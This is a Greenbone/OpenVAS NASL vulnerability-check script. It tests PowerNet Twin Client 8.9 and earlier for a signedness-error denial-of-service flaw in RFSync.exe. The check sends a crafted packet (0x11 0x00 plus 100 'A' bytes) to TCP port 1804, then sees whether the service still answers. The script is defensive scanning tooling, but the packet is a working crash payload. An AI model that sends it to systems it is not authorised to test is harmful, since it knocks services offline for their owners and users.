if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.802905" );
	script_version( "$Revision: 11374 $" );
	script_tag( name: "cvss_base", value: "7.8" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:N/I:N/A:C" );
	script_tag( name: "last_modification", value: "$Date: 2018-09-13 14:45:05 +0200 (Thu, 13 Sep 2018) $" );
	script_tag( name: "creation_date", value: "2012-07-03 18:13:10 +0530 (Tue, 03 Jul 2012)" );
	script_name( "PowerNet Twin Client 'RFSynC' Denial of Service Vulnerability" );
	script_category( ACT_DENIAL );
	script_copyright( "This script is Copyright (C) 2012 Greenbone Networks GmbH" );
	script_family( "Denial of Service" );
	script_dependencies( "find_service.sc" );
	script_require_ports( 1804 );
	script_xref( name: "URL", value: "http://secunia.com/advisories/49754/" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/19456/" );
	script_xref( name: "URL", value: "http://aluigi.altervista.org/adv/powernet_1-adv.txt" );
	script_tag( name: "impact", value: "Successful exploitation may allow remote attackers to cause the
  application to crash, creating a denial of service condition." );
	script_tag( name: "affected", value: "PowerNet Twin Client 8.9 and prior" );
	script_tag( name: "insight", value: "A signedness error in 'RFSync.exe' when processing certain
  requests, can be exploited to cause a crash via a specially crafted request sent
  to TCP port 1804." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective
  features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "The host is running PowerNet Twin Client and is prone to denial of
  service vulnerability." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
port = 1804;
soc = open_sock_tcp( port );
if(!soc){
	exit( 0 );
}
req = raw_string( 0x11, 0x00 ) + crap( length: 100, data: "A" );
send( socket: soc, data: req );
close( soc );
sleep( 2 );
soc1 = open_sock_tcp( port );
if(!soc1){
	security_message( port );
	exit( 0 );
}
close( soc1 );

